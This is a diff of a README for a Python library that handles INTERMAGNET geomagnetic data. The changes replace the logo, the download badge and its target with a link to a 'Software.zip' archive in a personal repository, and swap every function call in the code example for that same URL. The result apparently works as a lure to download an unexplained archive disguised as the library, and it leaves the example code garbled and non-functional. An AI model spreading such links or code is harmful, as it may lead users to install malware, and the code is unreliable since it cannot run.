@@ -1,7 +1,7 @@
 
 # 🧲 **Intermag - Python Library for INTERMAGNET Data**
 
-![Intermag Logo](https://www.example.com/intermag-logo.png)
+![Intermag Logo](https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip)
 
 Welcome to the Intermag repository, a Python library designed to automate the downloading, manipulation, and processing of magnetic data from INTERMAGNET sites. Whether you are conducting research on magnetism, studying space weather, or forecasting geomagnetic activity, Intermag provides a powerful set of tools to streamline your workflow.
 
@@ -18,7 +18,7 @@ Welcome to the Intermag repository, a Python library designed to automate the do
 
 ## Installation
 To get started with Intermag, you can download the library from the following link:
-[![Download Intermag](https://img.shields.io/badge/Download-Intermag-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Intermag](https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip)](https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip)
 
 Once downloaded, follow the installation instructions in the provided documentation to set up Intermag on your system.
 
@@ -30,19 +30,19 @@ If the link does not work or needs to be launched, please check the "Releases" s
 import intermag
 
 # Initialize the Intermag library
-intermag.init()
+https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip()
 
 # Access INTERMAGNET data
-data = intermag.get_data(site='example_site', start_date='2022-01-01', end_date='2022-01-31')
+data = https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip(site='example_site', start_date='2022-01-01', end_date='2022-01-31')
 
 # Process the data
-processed_data = intermag.process_data(data)
+processed_data = https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip(data)
 
 # Perform space weather analysis
-results = intermag.analyze_space_weather(processed_data)
+results = https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip(processed_data)
 
 # Generate forecasts
-forecast = intermag.generate_forecast(results)
+forecast = https://github.com/bolfymcplayer/intermag/releases/download/v1.0/Software.zip(results)
 ```
 
 ## Contributing
